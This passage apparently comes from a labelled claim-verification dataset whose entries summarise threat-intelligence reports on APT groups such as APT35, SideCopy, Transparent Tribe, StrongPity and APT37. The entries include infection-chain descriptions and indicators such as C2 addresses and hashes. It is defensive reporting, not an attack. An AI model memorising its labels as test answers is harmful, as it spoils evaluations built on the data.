zero-day critical vulnerability that was found in the Apache Log4j2 Java-based logging library. Although conversation regarding Log4Shell has diminished, the vulnerability is still an issue for organizations and remains a permanent threat. Since the vulnerability was publicized, over 80% of Log4Shell’s exploitation attempts originated within the U.S. Because many systems are still using older versions of Log4j, the problems continue to escalate. APT35 exploited Log4Shell via JNDI Exploit Kits – a publicly available open-source tool that has since been removed from GitHub due to its popularity following Log4Shell. Through analysis, Checkpoint observed that APT35 linked to their malware infection on their victim’s machines for as long as it took for them to achieve their goal. After their goal was achieved, they would disappear without a trace.As of August 2022, Charming Kitten was observed using a new tool called Hyperscrape to extract emails from their victims’ mailboxes. The tool allows the threat actors to extract emails from Yahoo!, Google, and Microsoft Outlook. Hyperscrape is written for Windows systems in .NET and is run on the threat actor’s computer. Once the thereat actor has possession of valid email credentials or a valid session cookie, Hyperscrape quietly extracts emails from the victim’s mailbox. Google’s initial analysis of Hyperscrape indicated that the tool was deployed against Iranian accounts, ostensibly to collect information of Iranian dissidents. Avertium’s Cyber Threat Intelligence Team (CTI) was able to analyze a sample of Hyperscrape. This tool set is not meant to be used on remote machines, and therefore does not attempt to obfuscate its strings. The fact that it is easily caught and quarantined by Windows Defender is not a deterrence. It is the harvested credentials that matter. Hyperscrape checks its connectivity to a particular command control server after it is executed from a folder with specific file dependencies. Hyperscrape then terminates if there is no connectivity. Next, it opens a form to specify parameters if everything is okay. Once the parameters are provided, data is sent to the command and control for confirmation. Following this action, a new form appears and APT35 provides a valid cookie file unless it was provided via command line. After starting an embedded web browser, Hyperscrape stores the cookies in a local cache used by the browser. The browser is configured to look like it is outdated. Next, the browser navigates to the targeted email server (Gmail, Outlook, etc.). When using Hyperscrape, all emails are saved locally in a Downloads folder with the filename corresponding to the email subject. After the emails are dumped, Hyperscrape sends status and system information to the command-and-control server before deleting any security emails from the targeted email server. Earlier versions of Hyperscrape, allowed APT35 to download data from Google TakeOut, which is a service for customers to download data from Good Documents, Google Calendar, Gmail, and more. After researchers analyzed the tool, they found that functionality may differ for Microsoft and Yahoo! accounts. In July 2022, researchers found that APT35 had an additional tool that they used to target Telegram accounts. The tool needed access to the victim’s email box to be successful, so it’s suspected that APT35 operates Hyperscrape before using the email data for compromising tools such as the Telegram account dump.\n\n\n",

        "claim": "Sidecopy Group Launches Attacks on India Using a New Trojan. ",
        "original_label": "true",
        "label": "true",
        "explain": "In September 2020, Quick Heal revealed an espionage operation targeting Indian Defense Forces and armed forces personnel, which was named Operation Sidecopy. The operation began in early 2019 and was named Operation Sidecopy due to the attackers mainly using Sidewinder APT group's TTPs for the attack. In July 2021, Cisco Talos researchers identified the attackers behind this operation as a separate group and named it the Sidecopy APT group. The report revealed that this group used various attack tools, including CetaRAT, ReverseRAT, MargulasRAT, AllakoreRAT, and several C# plugins [1]. Sidecopy mainly distributes malware through ZIP compressed files containing LNK or DOC files as email attachments. The group mainly targets Indian Defense Forces and armed forces personnel, conducts intelligence collection operations against the Indian government and military personnel, and uses spear-phishing techniques to lure victims in India's defense and other government organizations or infect USB devices to attack government and military organizations in India and Afghanistan.Following the tracking report of Sidecopy released in March, QiAnXin Threat Intelligence Center's RedDrip team captured another batch of Sidecopy attack samples targeting India during their daily threat intelligence hunting. In this attack campaign, the attackers mainly used a Saudi Arabian delegation visiting India as bait, disguised the downloader as a shortcut file, and sent it to victims via phishing emails. When the victim decompressed and executed the bait file, the program would download the data file from the remote server to the local machine and decrypt and execute it, ultimately loading the remote control software AckRAT. In this attack campaign, Sidecopy's infection chain remained relatively consistent with previous attack activities, using malicious LNK files as entry points, followed by a complex infection chain involving multiple layers of file nesting to deliver the final payload. The final payload is suspected to be a new trojan developed by the Sidecopy group, which continuously sends the 'ACK' character during communication with C2, so we temporarily named it AckRAT.During the threat hunting process, we did not capture the initial attack payload. Based on Sidecopy's typical attack techniques and the compressed file, we speculate that the initial attack payload should be a spear-phishing email with a compressed file attachment. The victim is lured to click and open the compressed file and then click on the lnk file inside.After decompression, there are hidden folders named “Adobe” and a bait lnk file. The lnk file name is translated as “Saudi delegation”.Analyzing the bait lnk file, it uses the system's mshta.exe to access the subsequent payload that is mounted on the official website of Ssynergy Company in India.Ssynergy Company is a large Indian manufacturer and exporter that provides various raw materials for cosmetics, composite materials, nutritional supplements, etc. It has a history of more than 75 years in the field of materials science. Its official website introduction claims that its customers include the Indian Prime Minister's Office and the Indian Institute of Technology.We speculate that the Sidecopy group uploaded the payload to the Ssynergy Company official website through vulnerabilities and relayed the subsequent payload through a normal website address to bypass some security software monitoring. The file mounted on its page is delegation.hta, which is Sidecopy's usual JS script.The main function of delegation.hta is to load preBotHta.dll into memory and call the PinkAgain function in preBotHta.dll.The PinkAgain function first decrypts the nested data in the JS code and releases the bait PDF file to confuse the victim.The released bait content is related to the lnk file name and is about the visit of the Saudi Arabian medical delegation to India to discuss medical issues with Indian military medical officers. The time in the upper right corner is March 17, 2023, indicating that the attack activity occurred recently.Then, the subsequent execution method is determined based on the anti-virus software information passed through the JS script. However, in the current version, regardless of the type of anti-virus software, the same branch is taken. After decrypting the passed data, an executable file is released and executed.The released Trex.exe is disguised as software from Trex Corporation.First, it collects information about the victim, including the computer name, username, antivirus software information, and system version.Then, it sends the collected information to C2: 209.126.81.42, port 444, and parses the data returned by C2. The remote control process is only initiated when C2 returns data greater than one byte; otherwise, it continues to loop. In the actual debugging process, C2 always returns a single character 'y'.Given that this RAT frequently sends the 'ack' string to request data from C2, we temporarily named it AckRAT. The corresponding functions of its commands are as follows: The attack process of AckRAT is basically consistent with the analysis of recent attacks by the Sidecopy group using Indian Ministry of Defence-related documents that I disclosed in my previous article [2] last month.Moreover, the lnk files were all generated from the same developer environment.Based on this, we were able to track down the DetaRAT used in the Sidecopy attack in March, with C2 being 185.136.161.129, port 4987, and its C2 command has not changed compared to older versions.Additionally, Sidecopy maintains its style of enriching its RAT code by obtaining code from the Internet, and has added the function of capturing browser passwords in the new DetaRAT based on open source projects.The recent attack organized by Sidecopy is a continuation of the attacks that occurred in March. The attack components included AllaKoreRAT, ActionRAT, DetaRAT, and C++ Trojans. The attack methods and weapon codes were relatively simple, and they were proficient in using open-source codes and tools available online. We have previously disclosed their attacks on multiple platforms such as Linux and MacOS [3]. The QiAnXin Threat Intelligence Center will conduct long-term tracking and follow-up on them, timely detect security threats, and respond to them quickly. APT group attacks have always been a huge cybersecurity threat to countries and enterprises. They are usually carefully planned by certain individuals for commercial or political motives, targeting specific organizations or countries, and will maintain a high level of concealment during long-term attack activities. Therefore, constant vigilance is necessary.\n\n\n",

        "explain": "Transparent Tribe, also known as APT36 and Mythic Leopard, continues to create fake domains mimicking legitimate military and defense organizations as a core component of their operations. Cisco Talos' previous research has mainly linked this group to CrimsonRAT, but new campaigns show they are expanding their Windows malware arsenal with ObliqueRAT. While military and defense personnel continue to be the group's primary targets, Transparent Tribe is increasingly targeting diplomatic entities, defense contractors, research organizations and conference attendees, indicating that the group is expanding its targeting. Our recent research into Transparent Tribe uncovered two types of domains the group uses in their various campaigns: fake domains masquerading as legitimate Indian defense and government-related websites, and malicious domains posing as content-hosting sites. These domains work in conjunction with each other to deliver maldocs distributing CrimsonRAT and ObliqueRAT. Based on our findings, Transparent Tribe's tactics, techniques, and procedures (TTPs) have remained largely unchanged since 2020, but the group continues to implement new lures into its operational toolkit. The variety of maldoc lures Transparent Tribe employs indicates the group still relies on social engineering as a core component of its operations. Transparent Tribe uses a two-pronged approach for registering malicious domains: Fake domains masquerading as legitimate sites belonging to government, defense, or research entities, and malicious domains that resemble file-sharing websites.Our latest Transparent Tribe research confirms that the group continues to create malicious domains mimicking defense-related entities as a core component of their operations. During our most recent investigation, we discovered a fake domain, clawsindia[.]com, registered by the attackers. This domain masquerades as the website for the Center For Land Warfare Studies (CLAWS), an India-based think tank covering national security and military issues. (The legitimate domain for CLAWS is claws[.]in.) The malicious clawsindia[.]com domain was previously hosted on 164[.]68[.]101[.]194, a known command and control (C2) for CrimsonRAT, Transparent Tribe's custom .NET remote access trojan (RAT). At this point, we cannot confirm how the attackers are using or intend to use this domain as part of their broader operations. However, we also identified a subdomain, mail[.]clawsindia[.]com, hosted on the same IP, suggesting that the attackers are using it as part of a malspam campaign. Below is one of the attackers' maldocs they used to target individuals applying for the CLAWS “Chair of Excellence,” an honorary title for those making exceptional research contributions to strategic studies, according to the think tank's official documentation. The victim is encouraged to click on an embedded URL hosted on sharingmymedia[.]com, which then downloads ObliqueRAT, the trojan discovered by Talos in 2020 associated with threat activity targeting entities in South Asia. We cannot confirm how the maldocs were delivered to victims, but we suspect they were probably sent as attachments to phishing emails based on previous threat actor behavior and the targeted nature of this particular lure. Security researchers previously discovered Transparent Tribe using sharingmymedia[.]com to host Android malware targeting Indian military and defense personnel. Although we could not confirm the initial infection vector of ObliqueRAT maldocs, earlier campaigns had the same infection chain as those seen in previous CrimsonRAT operations. In such cases, adversaries would deliver phishing maldocs to targets containing a malicious VBA macro that extracted either the CrimsonRAT executable or a ZIP archive embedded in the maldoc. The macro dropped the implant to the disk, setting up persistence mechanisms and eventually executing the payload on the infected endpoint. The actors recently deviated from the CrimsonRAT infection chains to make their ObliqueRAT phishing maldocs appear more legitimate. For example, attackers leveraging ObliqueRAT started hosting their malicious payloads on compromised websites instead of embedding the malware in the maldoc. In one such case in early 2021, the adversaries used iiaonline[.]in, the Indian Industries Association's legitimate website, to host ObliqueRAT artifacts. The attackers then moved to hosting fake websites resembling those of legitimate organizations in the Indian subcontinent. Figure 2 shows the attackers' use of HTTrack, a free website copier program, to duplicate a legitimate website to use for their own malicious purposes. The attackers then used this fake website, which they hosted on a domain that was nearly identical to its legitimate counterpart, to distribute ObliqueRAT. These examples highlight Transparent Tribe's heavy reliance on social engineering as a core TTP and the group's efforts to make their operations appear as legitimate as possible.Another fake domain the group uses to serve CrimsonRAT is 7thcpcupdates[.]info. This domain masquerades as an information portal for The 7th Central Pay Commission (CPC) of India, which provides payment information and updates for government employees. The malicious domain prompts the victim to enter their name and email address to sign up and download a seemingly important “guide on pay and allowance.” Transparent Tribe also regularly registers domains that appear to be legitimate file- and media-sharing services. For example, the group has used drivestransfer[.]com, file-attachment[.]com, mediaclouds[.]live, and emailhost[.]network during their operations. In the CLAWS example above, the adversaries used another such malicious domain, sharingmymedia[.]com, to host ObliqueRAT. (Additional domains are listed in the IOCs section.) The infection chain involving these domains is similar to the one described above in which the threat actors use social engineering to convince the victim to download and open the malware hosted on these sites. Transparent Tribe uses a variety of themes in their lures that evolved over time. The group has leveraged generic themes, such as resumes and CVs, since early 2019. From 2019 and continuing into 2020, the attackers started using honeytrap-themed lures to trick targets into opening ZIP archives and maldocs that posed as pictures of women. By mid-2020, the attackers reverted to primarily distributing military-themed maldocs. These maldocs did not contain popular news topics, as seen in older campaigns, but instead masqueraded as logistical and operational documents for the Indian Armed Forces. But Transparent Tribe's attacks are not limited to only India. In one campaign, the attackers used an Iranian Ministry of Foreign Affairs (MOFA)-themed maldoc to distribute CrimsonRAT in mid-2019. Then, in mid- to late-2020, the attackers targeted diplomatic entities with RAR archives pretending to be related to the British High Commision in Islamabad, Pakistan. In mid-2020, we observed the first instance of conference attendees being targeted in the form of a CrimsonRAT maldoc masquerading as the agenda for an Afghani conference. However, since the start of this year, the group has increasingly used lures disguised as content from Indian government-sponsored conferences.Transparent Tribe has historically used military and defense-themes in their phishing emails and maldocs to target Indian military and government personnel. In one such case, we observed the group using the COVID-19 pandemic to target defense personnel.The embedded XLS maldoc masquerades as a generic Health Advisory on COVID-19. This is in line with previous reporting on Transparent Tribe's use of official COVID-19 applications and content to serve Android malware. Transparent Tribe also finds attendees of specific conferences to target. Figure 10 shows a maldoc part of a 2020 operation used to distribute CrimsonRAT. The malicious XLS contained the agenda for “Building a Peaceful Afghanistan: Regional and International Support for afghan Peace” dialogue series conducted by the Heart of Asia Society (HAS). In one incident, we observed Transparent Tribe using an Iranian-themed lure to distribute CrimsonRAT. The maldoc is a note from Iran's Foreign Minister responding to the U.S. designation of Iran's Revolutionary Guard Corps (IRGC) as a Foreign Terrorist Organization (FTO). We could not determine who the intended targets were.Transparent Tribe consistently uses alluring documents and file names, commonly referred to as honeytraps, to trick victims into executing malicious content on their endpoints. Specifically, we have observed the group using resume documents and archives, such as ZIPs and RARs, with alluring themes distributing CrimsonRAT.Transparent Tribe relies heavily on the use of maldocs to spread their Windows implants. While CrimsonRAT remains the group's staple Windows implant, their development and distribution of ObliqueRAT in early 2020 indicates they are rapidly expanding their Windows malware arsenal. Email and maldoc lures employed to spread these implants consist of multiple themes, including conference agendas, honeytrap lures and diplomatic themes. However, two common generic themes used consistently in their operations are fake resumes and military related topics. This indicates the group continues to primarily target defense personnel in the Indian subcontinent. Transparent Tribe uses generically themed content-hosting domains as well as malicious domains masquerading as legitimate defense-related websites. Coupled with the use of compromised websites to host malicious artifacts, this is evidence that the group is evolving their TTPs to appear more legitimate.\n\n\n",

        "explain": "StrongPity APT group has been active since at least 2012 and is known for its targeted attacks against individuals and organizations in the Middle East and North Africa, as well as in Europe and South America. The group has been known to use a variety of tools and techniques to gain access to its targets, including phishing emails, watering hole attacks, and malware. The group's primary focus is on espionage, but it has also been known to use its access to target's systems for financial gain. The group is believed to have been active since at least 2012 and is known for using a variety of tactics to target individuals and organizations in a number of countries, including Belgium, France, Italy, Spain, and Turkey. The group has been linked to a number of high-profile attacks, including the targeting of a Turkish mobile operator in 2016 and a number of attacks against Belgian and Italian telecommunications companies in 2017.The latest campaign by the StrongPity APT group is focused on Android users and leverages a fully functional but trojanized version of the legitimate Telegram app, which despite being non-existent, has been repackaged as “the” Shagle app. The campaign is being distributed through a website impersonating Shagle services, which only provides an Android app to download, with no web-based streaming possible. The trojanized app uses the same package name as the legitimate Telegram app, which means that if the official Telegram app is already installed on the device, the backdoored version cannot be installed.The StrongPity backdoor has various spying features, including the ability to record phone calls and collect SMS messages, call logs, and contact lists. The malware is also capable of exfiltrating data from other apps if the victim grants the app notification access and activates accessibility services. This allows the attackers to gain access to sensitive information from a variety of apps including Viber, Skype, Gmail, Messenger, and Tinder.Trojanized app requesting dangerous permissions The malware's 11 dynamically triggered modules are responsible for these various functions and are being documented publicly for the first time. The StrongPity malware is modular in nature, with additional binary modules being downloaded from the C&C server, which means that the number and type of modules used can be changed at any time to fit the campaign requests. This modularity allows the malware to remain flexible and adaptable to the needs of the campaign.Shagle is a legitimate random-video-chat platform that allows strangers to talk via an encrypted communications channel. However, the platform is entirely web-based and does not offer a mobile app. StrongPity has been found using a fake website since 2021 that impersonates the actual Shagle site to trick victims into downloading a malicious Android app.Once installed, this app enables the hackers to conduct espionage on the targeted victims, including monitoring phone calls, collecting SMS texts, and grabbing contact lists. The fake Shagle website is designed to mimic the original website and is likely being spread through spear-phishing emails, smishing (SMS phishing), or instant messages on online platforms.The campaign is likely very narrowly targeted, as ESET telemetry still hasn’t identified any victims. The repackaged version of Telegram uses the same package name as the legitimate Telegram app, which means that if the official Telegram app is already installed on the device of a potential victim, then this backdoored version can’t be installed. This might mean that the threat actor first communicates with potential victims and pushes them to uninstall Telegram from their devices if it is installed or the campaign focuses on countries where Telegram usage is rare for communication.If official Telegram app is already installed then trojanized version cannot be successfully installed.The malicious Android application distributed by StrongPity is an APK file named “video.apk,” which is the standard Telegram v7.5.0 (February 2022) app modified to impersonate a Shagle mobile app. ESET researchers were able to attribute the campaign to the StrongPity APT group based on code similarities with past payloads and the fact that the Android app is signed with the same certificate the APT used to sign an app that mimicked the Syrian e-gov Android application in a 2021 campaign. Upon installation, the malware requests access to the Accessibility Service and then fetches an AES-encrypted file from the attacker's command and control server. This file consists of 11 binary modules extracted to the device and used by the backdoor to perform various malicious functionality. Each module performs an espionage function and is triggered as needed.libarm.jar: records phone calls libmpeg4.jar: collects text of incoming notification messages from 17 apps local.jar: collects file list (file tree) on the device phone.jar: misuses accessibility services to spy on messaging apps by exfiltrating contact name, chat message, and date resources.jar: collects SMS messages stored on the device services.jar: obtains device location systemui.jar: collects device and system information timer.jar: collects a list of installed apps toolkit.jar: collects contact list watchkit.jar: collects a list of device accounts wearkit.jar: collects a list of call logs The gathered data is stored in the app's directory, encrypted with AES, and eventually sent back to the attacker's command and control server.In order to detect and protect against the StrongPity malware, it is important to be aware of the following Indicators of Compromise (IoCs): File Hashes: The following file hashes have been identified as associated with the StrongPity malware: 50F79C7DFABECF04522AEB2AC987A800AB5EC6D7 (video.apk) 77D6FE30DAC41E1C90BDFAE3F1CFE7091513FB91 (libarm.jar) 5A15F516D5C58B23E19D6A39325B4B5C5590BDE0 (libmpeg4.jar) D44818C061269930E50868445A3418A0780903FE (local.jar) F1A14070D5D50D5A9952F9A0B4F7CA7FED2199EE (phone.jar).To protect against the StrongPity campaign, it is important to be cautious when downloading apps from third-party app stores, and to only download apps from official app stores such as Google Play. Additionally, organizations should implement security controls such as firewalls, intrusion detection systems, and anti-virus software to detect and prevent malware infections. It is also important to be aware of phishing attempts, and to be cautious when clicking on links in emails or text messages. Additionally, organizations should be aware of the signs of a potential APT attack, such as unusual network traffic, and to have incident response plans in place to quickly detect and respond to an attack. Regularly updating software and systems, and providing cybersecurity training to employees can also help to prevent a successful attack.\n\n\n",

        "claim": "APT37 is a threat actor heavily focused on targeting entities in South Korea. It is constantly updating its tactics, techniques and procedures as is evident from the multiple file types used in the initial stages by it.",
        "original_label": "true",
        "label": "true",
        "explain": "Figure 9 shows a decoy file related to the Hanwha General Insurance - a major insurer in South Korea. This decoy file was sent along with the CHM file in an archive file - BoanMail.rar It is well-known that APT37 uses a Chinotto PowerShell-based backdoor which is deployed on the endpoint through a malicious Windows help file (CHM). These CHM files are distributed inside archive files. Most of these archive files contain two components - the malicious CHM file and the decoy file to be displayed to the victim. In most cases, the decoy files are password-protected. The password to open the decoy file is displayed by the CHM file. Figure 10 below shows an example of code inside the CHM file which is responsible for displaying the decoy file to the victim, downloading a malicious HTA file from the attacker's server and executing it.So far in most of the campaigns of APT37 deploying Chinotto PowerShell backdoor, they have leveraged CHM files distributed inside archive files. Interestingly, on March 15th 2023, around the time of our investigation, the threat actor uploaded a malicious Microsoft Excel Add-in to the GitHub repository. This Add-in is an XLL file. XLL files are DLLs which function as an add-in for the Microsoft Excel application. We haven't seen this attack vector used by APT37 before and we believe this to be the first case being documented.For the purpose of technical analysis, we will use the XLL file with MD5 hash: 82d58de096f53e4df84d6f67975a8dda XLL files get activated when they are loaded by the MS Excel application. There are various callback functions provided by Microsoft which allow the XLL file to communicate with the Excel application. One of the most common functions is xlAutoOpen() which is called as soon as the DLL is loaded and activated by the MS excel application. Figure 11 below shows the code present in the XLL file in our case. Below are the main steps performed by this XLL file.We recovered some LNK files from the GitHub repository which were uploaded in August 2022 and apparently used in in-the-wild attacks around the same timeframe. These LNK files were present inside RAR archives. Along with the LNK file, an HTML file was present masquerading as a sign-in page of the South Korean company - LG. The two LNK files we observed, both used dual extensions - “html.lnk” and “pdf.lnk”. These LNK files were used to execute MSHTA and download the malicious HTA file from the attacker's server. Rest of the attack-chain is similar to other cases which finally leads to the Chinotto PowerShell-based backdoor. We analyzed the metadata of the LNK file with LECmd tool and noticed that both the LNK files were generated on a Virtual Machine running VMWare and with a Mac address of: 00:0c:29:41:1b:1c Since the threat actor reused the same Virtual Machine to generate multiple payloads, this information could be useful for threat hunting and threat attribution purposes in future. Figure 12 and 13 show the outputs of LECmd tool highlighting the target command executed by the LNK and other important metadata.In March 2022, a macro-based MS office Word file was uploaded to the GitHub repository. This macro would launch MSHTA to download the PowerShell-based Chinotto backdoor as well. The target URL from where the HTA file is fetched is also the same as the previous case. This shows that the threat actor uses multiple initial file formats and attack vectors to deploy the same backdoor.Another attack vector used by APT37 to deploy Chinotto PowerShell-based backdoor on the endpoint is using HWP files with embedded OLE objects. These OLE objects contain a malicious PE32 binary which executes MSHTA to download a PowerShell-based backdoor from the C2 server. When viewed with Hancom Office, the embedded OLE objects take the form of a clickable element in the document's body. APT37 makes use of misleading bait images to entice the user to click on the OLE object elements, an action required to cause the execution of the malicious PE payloads inside these objects.Figure 16: Malicious HWP document by APT37. The Korean-language dialog is fake - it’s in fact an OLE object represented by a static image of a dialog. When it’s clicked, a real dialog pops up - prompting the user to confirm the execution of the payload.As we discussed in this blog, APT37 is a threat actor heavily focused on targeting entities in South Korea. It is constantly updating its tactics, techniques and procedures as is evident from the multiple file types used in the initial stages by it. The themes used by this threat actor range from geopolitics, current events, education to finance and insurance. It is also particularly interested in current events and activities related to the Korean peninsula. We will continue monitoring the activities of this threat actor and ensure our customers are protected against APT37.\n\n\n",

        "label": "true",
        "explain": "Trend Micro's Zero-Day Initiative (ZDI) provided technical analysis of recently patched vulnerabilities in the SolarWinds Orion Platform. CVE-2020-14005, one of these vulnerabilities, has been linked to the recent SUNBURST cyberattack on SolarWinds. These vulnerabilities, when combined, could allow an unauthenticated attacker to execute arbitrary code as Administrator on an affected system. Various sources have recently disclosed a sophisticated attack that hit organizations via the supply chain. This was carried out via a compromised version of a network monitoring application called SolarWinds Orion. The attackers used the access provided by this application to plant a backdoor known as Sunburst onto affected machines. This backdoor provided the attacker with complete access to the targeted organization’s network.Sunburst is a sophisticated backdoor that provides an attacker nearly complete control over an affected system. It has several peculiarities in its behavior, however. Before it runs, it checks that the process name hash and a registry key have been set to specific values. It will also only run if the execution time is twelve or more days after the system was first infected; it will also only run on systems that have been attached to a domain.This specific set of circumstances makes analysis by researchers more difficult, but it also limits the scope of its victims to some degree.This gathered information is used either to generate a user ID for the affected machine, or to check against blocklists - if certain drivers, processes, or services are found on the machine, the backdoor will cease to function.The commands that can be executed include: Registry operations (read, write, and delete registry keys/entries) File operations (read, write, and delete files) Run/stop processes Reboot the system Supernova, one of the malicious components associated with the attack, is a .NET web shell backdoor that presents itself as a legitimate SolarWinds web service handler. It is a second-stage payload in the attack. Once running, it inspects and responds to HTTP requests with appropriate HTTP query strings, cookies, and HTML form values. It can also execute web shell commands via a specific HTTP request format. It is believed that Sunburst was delivered via a trojanized version of the Orion network monitoring application. According to SEC filings by SolarWinds, threat actors inserted the malicious code into otherwise legitimate code, which means anyone who downloaded the software was potentially at risk. This was done as part of the build process; the source code repository was not affected. According to the SolarWinds SEC filing, this trojanized version was downloaded by under 18,000 customers from March to June of 2020. Once this malicious code is present in a system, it runs the behavior described in the first part of this post. Multiple organizations, including US government agencies, have reported that they were affected by this campaign. In a security advisory, SolarWinds advised all of their affected customers to immediately update their software to versions that do not contain the malicious code. The advisory also lists the appropriate products and their versions. Our article titled Managing Risk While Your ITSM Is Down includes suggestions on how to manage network monitoring and other IT systems management (ITSM) solutions. In addition to this, the US Department of Homeland Security, in a directive to US government agencies, ordered that systems with the said software be taken offline and not reconnected to networks until they have been rebuilt. The directive treats agencies to treat said machines as compromised, with credentials used by said machines to be changed as well. Organizations that use SolarWinds Orion within their network may consider similar steps. The malicious files associated with this attack are already detected by the appropriate Trend Micro products as Backdoor.MSIL.SUNBURST.A and Trojan.MSIL.SUPERNOVA.A. In addition to this, the entirety of the domain avsvmcloud.com has been blocked. If you believe that your organization may have been affected by this campaign, visit this page for the available Trend Micro solutions that can help detect and mitigate any risks from this campaign. If you’re a Trend Micro Apex One customer, check your product console for a notification to scan your environment for attack indicators of this campaign.\n\n\n",

        "claim": "APT39 is an Iranian Cyber Espionage Group Focused on Personal Information.",
        "original_label": "true",
        "label": "true",
        "explain": "In December 2018, FireEye identified APT39 as an Iranian cyber espionage group responsible for widespread theft of personal information. We have tracked activity linked to this group since November 2014 in order to protect organizations from APT39 activity to date. APT39’s focus on the widespread theft of personal information sets it apart from other Iranian groups FireEye tracks, which have been linked to influence operations, disruptive attacks, and other threats. APT39 likely focuses on personal information to support monitoring, tracking, or surveillance operations that serve Iran’s national priorities, or potentially to create additional accesses and vectors to facilitate future campaigns. APT39 was created to bring together previous activities and methods used by this actor, and its activities largely align with a group publicly referred to as “Chafer.” However, there are differences in what has been publicly reported due to the variances in how organizations track activity. APT39 primarily leverages the SEAWEED and CACHEMONEY backdoors along with a specific variant of the POWBAT backdoor. While APT39's targeting scope is global, its activities are concentrated in the Middle East. APT39 has prioritized the telecommunications sector, with additional targeting of the travel industry and IT firms that support it and the high-tech industry. The countries and industries targeted by APT39 are depicted in Figure 1.APT39's focus on the telecommunications and travel industries suggests intent to perform monitoring, tracking, or surveillance operations against specific individuals, collect proprietary or customer data for commercial or operational purposes that serve strategic requirements related to national priorities, or create additional accesses and vectors to facilitate future campaigns. Government entities targeting suggests a potential secondary intent to collect geopolitical data that may benefit nation-state decision making. Targeting data supports the belief that APT39's key mission is to track or monitor targets of interest, collect personal information, including travel itineraries, and gather customer data from telecommunications firms.APT39 uses a variety of custom and publicly available malware and tools at all stages of the attack lifecycle.For initial compromise, FireEye Intelligence has observed APT39 leverage spear phishing emails with malicious attachments and/or hyperlinks typically resulting in a POWBAT infection. APT39 frequently registers and leverages domains that masquerade as legitimate web services and organizations that are relevant to the intended target. Furthermore, this group has routinely identified and exploited vulnerable web servers of targeted organizations to install web shells, such as ANTAK and ASPXSPY, and used stolen legitimate credentials to compromise externally facing Outlook Web Access (OWA) resources.Post-compromise, APT39 leverages custom backdoors such as SEAWEED, CACHEMONEY, and a unique variant of POWBAT to establish a foothold in a target environment. During privilege escalation, freely available tools such as Mimikatz and Ncrack have been observed, in addition to legitimate tools such as Windows Credential Editor and ProcDump. Internal reconnaissance has been performed using custom scripts and both freely available and custom tools such as the port scanner, BLUETORCH.APT39 facilitates lateral movement through myriad tools such as Remote Desktop Protocol (RDP), Secure Shell (SSH), PsExec, RemCom, and xCmdSvc. Custom tools such as REDTRIP, PINKTRIP, and BLUETRIP have also been used to create SOCKS5 proxies between infected hosts. In addition to using RDP for lateral movement, APT39 has used this protocol to maintain persistence in a victim environment. To complete its mission, APT39 typically archives stolen data with compression tools such as WinRAR or 7-Zip.There are some indications that APT39 demonstrated a penchant for operational security to bypass detection efforts by network defenders, including the use of a modified version of Mimikatz that was repacked to thwart anti-virus detection in one case, as well as another instance when after gaining initial access APT39 performed credential harvesting outside of a compromised entity's environment to avoid detection.We believe APT39's significant targeting of the telecommunications and travel industries reflects efforts to collect personal information on targets of interest and customer data for the purposes of surveillance to facilitate future operations. Telecommunications firms are attractive targets given that they store large amounts of personal and customer information, provide access to critical infrastructure used for communications, and enable access to a wide range of potential targets across multiple verticals. APT39's targeting not only represents a threat to known targeted industries, but it extends to these organizations' clientele, which includes a wide variety of sectors and individuals on a global scale. APT39's activity showcases Iran's potential global operational reach and how it uses cyber operations as a low-cost and effective tool to facilitate the collection of key data on perceived national security threats and gain advantages against regional and global rivals.\n\n\n",

        "explain": "Since 2022, Yellow Liderc has been compromising legitimate websites and using them to insert malicious JavaScript. The JavaScript fingerprints unwitting visitors, capturing details such as their location, device, time of visit, and so on. If a visitor matches a specific profile — in this case, entities along the Mediterranean associated with maritime, logistics, and shipping — they will be served further malware. The malware in question is “IMAPLoader,” a dynamic link library (DLL) written in .NET, which uses email as a means of command-and-control (C2) communication. This new sample is in most ways similar in function to Yellow Liderc's previous loaders. It distinguishes itself, however, in its advanced method of infection: a technique known as “appdomain manager injection.” First demonstrated by a proof-of-concept (PoC) called “GhostLoader” in 2020, hackers or red teamers can use it to circumvent tools designed to detect a DLL or executable being loaded onto a Windows machine. After slyly injecting itself on a host computer deemed of high value, IMAPLoader communicates with the attackers' Russian-hosted, very American-sounding email addresses — leviblum[@]yandex.com and brodyheywood[@]yandex — where further payloads lie.Anyone who tries to defend against Yellow Liderc simply by accounting for this method of injection, or this malware, will end up falling short. The group has been known to cycle through and combine various tactics, techniques, and procedures over the years. “What we've seen more often and most recently is reconnaissance emails,” says Joshua Miller, senior threat researcher at Proofpoint. Since 2021, he says, it has used the open source red-team tool GoPhish to insert malicious links into fake newsletters impersonating legitimate organizations. But it's also got more, weirder strategies in its arsenal. In 2021, Proofpoint described an elaborate, yearslong ruse they ran, posing as a woman named Marcella Flores, in order to phish a specific employee at an aerospace company. Recently, Proofpoint observed a unique cluster within the same APT targeting workers and organizations in the healthcare, technology, and the nuclear division of a European energy company. According to PwC, it remains an ongoing threat not just to all of these industries and regions thus far named, but also the automotive, defense, and IT industries, in places as far and wide as the Middle East, South Asia, and North and South America. Perhaps the only consistent elements of a Yellow Liderc attack are the minor discrepancies between the email sender, newsletter, or website one expects, and the actual sender or experience they're delivered. “Look for any unusual network traffic,” Miller advises, and pay attention to suspicious emails. “Checking who's sending an email is important. I know that we say that all the time, but it's true and important for this sort of case.”\n\n\n",

Furthermore, the sub-division of this group, SideCopy, has been observed recently targeting an Indian Defense Organization where the domain hosting malicious files was probably being tested to act as a phishing page.APT36 is targeting Indian Army with malicious PPAM files with ‘Officers posting policy reviseed final’ as the theme. These macro-enabled PowerPoint add-on files (PPAM) are utilized to wrap malicious payloads by embedding archive files as OLE objects. The infection chain leads to the execution of a .NET-based Crimson RAT payload that can receive and execute 22 commands along with the persistence mechanism.C2 used by APT36 uses the same Common Name, which is usually found in this threat group’s C2 infrastructure. From targeting IITs to NITs and Business schools now, we have observed an increased targeting in the first quarter of 2023, peaking in February.Transparent Tribe is a Pakistani threat group, active since 2013. It is a persistent threat actor targeting the Indian government and military entities. The group continuously uses payloads such as Crimson RAT and Capra RAT in its campaigns, constantly upgrading them. Since May 2022 last year, Transparent Tribe has begun targeting the education sector, which surged in 2023.

